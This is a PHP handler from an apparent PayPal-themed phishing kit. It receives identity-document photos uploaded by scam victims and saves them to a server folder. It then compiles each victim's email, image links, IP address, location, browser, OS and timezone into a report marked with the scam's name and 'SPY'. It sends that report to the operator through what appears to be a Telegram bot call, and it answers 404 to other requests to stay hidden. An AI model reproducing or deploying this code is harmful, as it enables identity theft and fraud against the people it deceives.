<?php
/*

# Author               9ouraydess

*/
    if(isset($_POST['doc_type'])&&isset($_POST['images'])){
	session_start();
	include '../mine.php';
	include '../bot.php';
	include './../../config/email.php';
	function upImg($vl){
		$t=microtime(true);
		$micro=sprintf("%06d",($t - floor($t))* 1000000);
		$today=date("m.d.y.h.i.s.U".$micro,$t);
		$name=hash('md5',$today);
		$type=explode(';',$vl)[0];
		$type='.'.explode('/',$type)[1];
		$base='Folder -> /proof/ Image Name ->';
		file_put_contents('./../../proof/'.$name.$type,base64_decode(explode(',',$vl)[1]));
		return $name.$type;
	}
		$_SESSION['doc_type']=$_POST['doc_type'];
		
		$currentUR = $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']);
		$currentURL = str_replace('extra/stockers', 'proof/', $currentUR);

		$msg="=========== <[ -".$scamname."- PPL IDENTITY ]> ===========\r\n";
		$msg.="ID OF USER	: {$_SESSION['EML']}\r\n";
		$msg.="TYPE		: {$_POST['doc_type']}\r\n";
		$ii=0;
		for($i=0;$i<count($_POST['images']);$i++){
		    $ii++;
			$msg.="IMG $ii: $currentURL".upImg($_POST['images'][$i])."\r\n";
		}
		$msg.="---------------------- IP Info ----------------------\r\n";
		$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
		$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
		$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
		$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
		$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
		$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
		$msg.="TIME		: ".now()." GMT\r\n";
		$msg.="=========== <[ SPY  ]> ===========\r\n\r\n\r\n";
		tm($api,$chatid1,$msg);
	
		exit('done');
}

if(!isset($_POST['doc_type'])){
     header('HTTP/1.0 404 Not Found');
}
?>